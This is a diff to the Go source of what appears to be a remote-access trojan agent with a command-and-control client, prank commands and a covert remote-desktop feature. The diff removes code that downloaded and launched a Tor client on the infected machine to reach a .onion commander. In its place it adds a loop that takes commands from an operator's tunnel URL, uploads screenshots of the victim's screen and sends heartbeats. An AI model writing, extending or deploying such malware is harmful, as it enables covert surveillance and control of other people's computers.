@@ -1,10 +1,8 @@
 package main
 
 import (
-	"archive/tar"
 	"archive/zip"
 	"bytes"
-	"compress/gzip"
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
@@ -22,7 +20,6 @@ import (
 	mrand "math/rand"
 	"net"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"os/user"
@@ -1144,159 +1141,22 @@ func captureScreenJPEG(quality int, scale float64) ([]byte, error) {
 }
 
 // ================================================================
-// VNC — TOR CLIENT (SOCKS5 PROXY FOR AGENT)
+// VNC — TUNNEL CONNECTION
 // ================================================================
 
-// Build-time constants — replaced by setup.py
-const (
-	vncOnionAddr = "placeholder.onion"
-	vncAuthToken = "placeholder_token"
-)
-
-var torClientProcess *exec.Cmd
-
-func getTorClientPath() string {
-	return filepath.Join(os.TempDir(), "tor_client", "tor.exe")
-}
-
-func downloadTorClient() (string, error) {
-	torExe := getTorClientPath()
-	if _, err := os.Stat(torExe); err == nil {
-		return torExe, nil
-	}
-
-	torDir := filepath.Dir(torExe)
-	os.MkdirAll(torDir, 0755)
-
-	// Download Tor Expert Bundle
-	torURL := "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.4/tor-expert-bundle-windows-x86_64-14.0.4.tar.gz"
-	resp, err := http.Get(torURL)
-	if err != nil {
-		return "", fmt.Errorf("download tor: %w", err)
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return "", fmt.Errorf("download tor: HTTP %d", resp.StatusCode)
-	}
-
-	// Extract tar.gz
-	gz, err := gzip.NewReader(resp.Body)
-	if err != nil {
-		return "", fmt.Errorf("gzip: %w", err)
-	}
-	defer gz.Close()
-
-	tr := tar.NewReader(gz)
-	for {
-		hdr, err := tr.Next()
-		if err == io.EOF {
-			break
-		}
-		if err != nil {
-			return "", fmt.Errorf("tar: %w", err)
-		}
-
-		// Extract all files under tor/ to our tor_client dir
-		name := filepath.ToSlash(hdr.Name)
-		if strings.Contains(name, "tor/") && hdr.Typeflag == tar.TypeReg {
-			// Flatten: tor/tor.exe → tor_client/tor.exe, tor/libcrypto*.dll → tor_client/libcrypto*.dll
-			base := filepath.Base(name)
-			outPath := filepath.Join(torDir, base)
-			f, err := os.Create(outPath)
-			if err != nil {
-				continue
-			}
-			io.Copy(f, tr)
-			f.Close()
-		}
-	}
-
-	if _, err := os.Stat(torExe); err != nil {
-		return "", fmt.Errorf("tor.exe not found after extraction")
-	}
-
-	return torExe, nil
-}
-
-func startTorSocks() (int, error) {
-	torExe, err := downloadTorClient()
-	if err != nil {
-		return 0, err
-	}
-
-	torDir := filepath.Dir(torExe)
-	dataDir := filepath.Join(torDir, "data")
-	os.MkdirAll(dataDir, 0755)
-
-	// Find a free port for SOCKS
-	ln, err := net.Listen("tcp", "127.0.0.1:0")
-	if err != nil {
-		return 0, err
-	}
-	port := ln.Addr().(*net.TCPAddr).Port
-	ln.Close()
-
-	// Write torrc
-	torrc := filepath.Join(torDir, "torrc")
-	content := fmt.Sprintf("SocksPort %d\nDataDirectory %s\n", port, filepath.ToSlash(dataDir))
-	os.WriteFile(torrc, []byte(content), 0644)
-
-	// Start tor
-	cmd := exec.Command(torExe, "-f", torrc)
-	cmd.Dir = torDir
-	cmd.Stdout = nil
-	cmd.Stderr = nil
-	if err := cmd.Start(); err != nil {
-		return 0, fmt.Errorf("start tor: %w", err)
-	}
-	torClientProcess = cmd
-
-	// Wait for SOCKS port to be ready
-	for i := 0; i < 60; i++ {
-		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), time.Second)
-		if err == nil {
-			conn.Close()
-			return port, nil
-		}
-		time.Sleep(2 * time.Second)
-	}
-
-	return 0, fmt.Errorf("tor SOCKS port not ready after 120s")
-}
-
-func stopTorClient() {
-	if torClientProcess != nil && torClientProcess.Process != nil {
-		torClientProcess.Process.Kill()
-		torClientProcess = nil
-	}
-}
-
 // ================================================================
-// VNC — AGENT CLIENT LOOP
+// VNC — AGENT CLIENT LOOP (connects to tunnel URL via direct HTTP)
 // ================================================================
 
-func startVNCClient(ctx context.Context, c2 *C2Client) {
-	if vncOnionAddr == "placeholder.onion" || vncOnionAddr == "" {
+func startVNCClient(ctx context.Context, tunnelURL string, authToken string) {
+	if tunnelURL == "" {
 		return
 	}
 
-	// Start Tor SOCKS proxy
-	socksPort, err := startTorSocks()
-	if err != nil {
-		return
-	}
-
-	// Create HTTP client with SOCKS5 proxy
-	proxyURL, _ := url.Parse(fmt.Sprintf("socks5://127.0.0.1:%d", socksPort))
-	transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
-	client := &http.Client{Transport: transport, Timeout: 30 * time.Second}
-
-	baseURL := fmt.Sprintf("http://%s", vncOnionAddr)
+	client := &http.Client{Timeout: 15 * time.Second}
+	baseURL := strings.TrimRight(tunnelURL, "/")
 	quality := 50
 	scale := 0.75
-
-	defer stopTorClient()
 
 	for {
 		select {
@@ -1307,10 +1167,10 @@ func startVNCClient(ctx context.Context, c2 *C2Client) {
 
 		// Poll for commands
 		req, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/api/commands", nil)
-		req.Header.Set("Authorization", "Bearer "+vncAuthToken)
+		req.Header.Set("Authorization", "Bearer "+authToken)
 		resp, err := client.Do(req)
 		if err != nil {
-			time.Sleep(3 * time.Second)
+			time.Sleep(2 * time.Second)
 			continue
 		}
 
@@ -1363,7 +1223,7 @@ func startVNCClient(ctx context.Context, c2 *C2Client) {
 		jpegData, err := captureScreenJPEG(quality, scale)
 		if err == nil && len(jpegData) > 0 {
 			req, _ := http.NewRequestWithContext(ctx, "POST", baseURL+"/api/screenshot", bytes.NewReader(jpegData))
-			req.Header.Set("Authorization", "Bearer "+vncAuthToken)
+			req.Header.Set("Authorization", "Bearer "+authToken)
 			req.Header.Set("Content-Type", "image/jpeg")
 			resp, err := client.Do(req)
 			if err == nil {
@@ -1373,7 +1233,7 @@ func startVNCClient(ctx context.Context, c2 *C2Client) {
 
 		// Heartbeat
 		req, _ = http.NewRequestWithContext(ctx, "POST", baseURL+"/api/heartbeat", nil)
-		req.Header.Set("Authorization", "Bearer "+vncAuthToken)
+		req.Header.Set("Authorization", "Bearer "+authToken)
 		resp, err = client.Do(req)
 		if err == nil {
 			resp.Body.Close()
@@ -2454,7 +2314,7 @@ PRANKS
   soundspam      - Play all Windows sounds
 
 REMOTE DESKTOP
-  vnc_start      - Start VNC client (connects to commander via Tor)
+  vnc_start      - Start VNC client (connects to commander via tunnel)
   vnc_stop       - Stop VNC client
 
 CONTROL
@@ -2726,13 +2586,18 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 		result = fmt.Sprintf("Slept %d seconds", args.Seconds)
 
 	case "vnc_start":
-		if vncOnionAddr == "placeholder.onion" || vncOnionAddr == "" {
-			result = "VNC not configured — no .onion address set at build time"
+		var vncArgs struct {
+			TunnelURL string `json:"tunnel_url"`
+			AuthToken string `json:"auth_token"`
+		}
+		json.Unmarshal([]byte(cmd.Args), &vncArgs)
+		if vncArgs.TunnelURL == "" {
+			result = "VNC start failed — no tunnel_url provided"
 		} else {
 			jm.Start("vnc", func(ctx context.Context) {
-				startVNCClient(ctx, c2)
+				startVNCClient(ctx, vncArgs.TunnelURL, vncArgs.AuthToken)
 			})
-			result = "VNC client connecting to " + vncOnionAddr
+			result = "VNC client connecting to " + vncArgs.TunnelURL
 		}
 
 	case "vnc_stop":
